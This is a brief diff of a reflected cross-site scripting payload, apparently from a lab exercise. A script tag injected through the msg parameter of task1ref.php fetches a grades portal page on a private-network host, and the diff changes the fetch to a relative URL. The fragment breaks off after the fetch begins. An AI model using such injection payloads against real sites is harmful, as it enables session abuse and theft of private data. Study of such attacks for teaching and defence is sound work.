@@ -1,6 +1,6 @@
 http://192.168.1.203/task1ref.php?msg=<script>
 (async () => {
-    const url = 'http://192.168.1.203/gradesPortal.php';
+    const url = '/gradesPortal.php';
 
     try {
         const response = await fetch(url);
